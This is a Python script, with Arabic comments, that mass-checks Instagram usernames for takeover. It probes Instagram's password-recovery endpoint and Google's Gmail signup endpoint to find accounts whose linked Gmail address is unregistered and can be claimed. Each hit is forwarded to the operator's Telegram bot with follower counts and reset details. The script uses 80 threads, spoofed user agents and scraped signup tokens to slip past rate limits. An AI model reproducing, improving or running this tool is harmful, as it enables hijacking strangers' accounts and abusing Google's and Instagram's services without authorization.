import os
import requests
from user_agent import generate_user_agent
from time import time
from hashlib import md5
from random import choice
from concurrent.futures import ThreadPoolExecutor
from cfonts import render, say
from requests import post as pp
from user_agent import generate_user_agent as gg
from random import choice as cc
from random import randrange as rr
import random
import base64
import re
import ethan
import sys
from asmix import Instagram
#=============================#
hits=0
bads_instgram=0
bads_email=0
p1=0
#=============================#
Z = '\033[1;31m'  # أحمر
b = random.randint(5,208)
bo = f'\x1b[38;5;{b}m'
Z1 = '\033[2;31m'  # أحمر ثاني
F = '\033[2;32m'  # أخضر
A = '\033[2;34m'  # أزرق
C = '\033[1;97m'  # أبيض
J = '\033[2;36m'  # سماوي
Y = '\033[1;34m'  # أزرق فاتح
X = '\033[1;33m'  # أصفر
M = '\x1b[1;37m'  # أبيض
S = '\033[1;33m'  # أصفر
R = '\033[1;31m'  # أحمر
C1 = '\033[2;35m'  # وردي
H = '\x1b[38;5;208m'  # برتقالي
ED = '\x1b[38;5;208m'  # برتقالي
Bl = '\033[1;34m'  # أزرق
P = '\033[1;35m'  # بنفسجي
G = '\033[1;32m'  # أخضر
N = '\033[1;37m'  # أبيض

ID = input(f"𝐈𝐃: ")
token = input(f"𝐓𝐎𝐊𝐄𝐍: ") 
pass
wr='1'
if wr==1:
	pass
os.system('clear')
def namefile():
  while True:
    try:
      namefile1= str(input(' مسار الملف الي تريد تفحصة   : '))
      ooo=open(namefile1,"r").read().splitlines()
      return ooo
    except:
      print(f"{R}الملف غير موجود ")
list99=namefile()
yy='azertyuiopmlkjhgfdsqwxcvbn'
ids=[]
def tll():
  try:
    n1=''.join(cc(yy)for i in range(rr(6,9)))
    n2=''.join(cc(yy)for i in range(rr(3,9)))
    host=''.join(cc(yy)for i in range(rr(15,30)))
    he3 = {
      "accept": "*/*",
      "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
      "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
      "google-accounts-xsrf": "1",
      "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
      "sec-ch-ua-arch": "\"\"",
      "sec-ch-ua-bitness": "\"\"",
      "sec-ch-ua-full-version": "\"116.0.5845.72\"",
      "sec-ch-ua-full-version-list": "\"Not)A;Brand\";v=\"24.0.0.0\", \"Chromium\";v=\"116.0.5845.72\"",
      "sec-ch-ua-mobile": "?1",
      "sec-ch-ua-model": "\"ANY-LX2\"",
      "sec-ch-ua-platform": "\"Android\"",
      "sec-ch-ua-platform-version": "\"13.0.0\"",
      "sec-ch-ua-wow64": "?0",
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-origin",
      "x-chrome-connected": "source=Chrome,eligible_for_consistency=true",
      "x-client-data": "CJjbygE=",
      "x-same-domain": "1",
      "Referrer-Policy": "strict-origin-when-cross-origin",
    'user-agent': str(gg()),
    }


    res1 = requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', headers=he3)
    tok= re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text).group(2)
    cookies={
      '__Host-GAPS':host
    }
    headers = {
      'authority': 'accounts.google.com',
      'accept': '*/*',
      'accept-language': 'en-US,en;q=0.9',
      'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
      'google-accounts-xsrf': '1',
      'origin': 'https://accounts.google.com',
      'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp',
      'user-agent': gg(),
  }
    data = {
    'f.req': '["'+tok+'","'+n1+'","'+n2+'","'+n1+'","'+n2+'",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
    'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
  }
    response = pp(
      'https://accounts.google.com/_/signup/validatepersonaldetails',
      cookies=cookies,
      headers=headers,
      data=data,
  )
    tl=str(response.text).split('",null,"')[1].split('"')[0]
    host=response.cookies.get_dict()['__Host-GAPS']
    try:os.remove('tl.txt')
    except:pass
    with open('tl.txt','a') as f:
      f.write(tl+'//'+host+'\n')
  except Exception as e:
    print(e)
    tll()
tll()
def check_gmail(email):
  if '@' in email:
    email = str(email).split('@')[0]
  try:
    try:
      o=open('tl.txt','r').read().splitlines()[0]
    except:
      tll()
      o=open('tl.txt','r').read().splitlines()[0]
    tl,host = o.split('//')
    cookies = {
    '__Host-GAPS': host
  }
    headers = {
    'authority': 'accounts.google.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
    'google-accounts-xsrf': '1',
    'origin': 'https://accounts.google.com',
    'referer': 'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL='+tl,
    'user-agent': gg(),
  }
    params = {
    'TL': tl,
  }
    data = 'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A'+tl+'%22%2C%22'+email+'%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&'
    response = pp(
    'https://accounts.google.com/_/signup/usernameavailability',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data,
  )
    if '"gf.uar",1' in str(response.text):return 'good'
    elif '"er",null,null,null,null,400' in str(response.text):
      tll()
      check_gmail(email)
    else:return 'bad'
  except:check_gmail(email)

os.system('clear')

def info(username,jj):
	global hits
	hits+=1
	oo = f"-1::{username}"
	ee = base64.b64encode(oo.encode('utf-8')).decode('utf-8')
	headers = {
	        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	    }
	    	
	rr = requests.get(f'https://instanavigation.net/api/v1/stories/{ee}', headers=headers).json()
	id = rr['user_info']['id']
	usern = rr['user_info']['username']
	full = rr['user_info']['full_name']
	ip = rr['user_info']['is_private']
	iv = rr['user_info']['is_verified']
	posts = rr['user_info']['posts']
	followers = rr['user_info']['followers']
	following = rr['user_info']['following']
	date = Instagram.date(id)
	rrr = Instagram.rest(username)
	try:
		ff = f"""
𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄 ➟ @{username}   
𝐅𝐎𝐋𝐋𝐎𝐖𝐄𝐑𝐒 ➟   {followers}  
𝐅𝐎𝐋𝐋𝐎𝐖𝐈𝐍𝐆  ➟  {following}
𝐓𝐎𝐓𝐀𝐋 𝐏𝐎𝐒𝐓 ➟ {posts}
𝐃𝐀𝐓𝐄 ➟  {date}
𝐌𝐀𝐈𝐋  ➟ {username}@{jj}
𝐑𝐄𝐒𝐄𝐓 ➟ {rrr}
𝐔𝐑𝐋  ➟   https://www.instagram.com/{username}
	        """
	        		
		requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={ff}")
	  	
	except:
		ff = f"""
𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄 ➟ @{username}  
𝐌𝐀𝐈𝐋  ➟ {username}@{jj}
𝐑𝐄𝐒𝐄𝐓 ➟ {rrr}
𝐔𝐑𝐋  ➟   https://www.instagram.com/{username}
	        """
	        		
		requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={ff}")
def bmw(email):
  global bads_email
  try:

    if 'good' == check_gmail(email):
        username,jj=email.split('@')
        info(username,jj)
    else:bads_email+=1
  except:''

def check(email):
  global bads_instgram,hits,bads_email
  try:
    pp=choice('00')
    b = random.randint(5,208)
    bo = f'\x1b[38;5;{b}m'
    bi = random.randint(5,208)
    bos = f'\x1b[38;5;{bi}m'

    if pp == '0':
        headers = {
                        'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
        'X-Pigeon-Rawclienttime': '1700251574.982',
        'X-IG-Connection-Speed': '-1kbps',
        'X-IG-Bandwidth-Speed-KBPS': '-1.000',
        'X-IG-Bandwidth-TotalBytes-B': '0',
        'X-IG-Bandwidth-TotalTime-MS': '0',
        'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
        'X-IG-Connection-Type': 'WIFI',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-App-ID': '567067343352427',
        'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
        'Accept-Language': 'en-GB, en-US',
        'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept-Encoding': 'gzip, deflate',
        'Host': 'i.instagram.com',
        'X-FB-HTTP-Engine': 'Liger',
        'Connection': 'keep-alive',
        'Content-Length': '356',
    }
  

        
        
        
        data = {
        f'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"{Lol}","guid":"{Gio}","device_id":"{DvD}","query":"' + email + '"}',
        'ig_sig_key_version': '4',
    }



        respon = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data).text
   
         
        if '"status":"ok"' in respon:bmw(email)
        else:bads_instgram+=1
        
    
  except:''
  
  bi = random.randint(5,208)
  cyan = f'\x1b[37;5;{bi}m'
  tt=(f'''
{bos}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  {H} hits : {hits} 
  {M}bad mail : {bads_email}
  {Z} bad insta : {bads_instgram}
  {J} {bo}email : {email}
{bos}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    ''')
  print(tt)


executor = ThreadPoolExecutor(max_workers=80)


for username in list99:
    try:
      if '@' in username:username=username.split('@')[0]
      email = username + '@gmail.com'
      executor.submit(check, email)
    except:''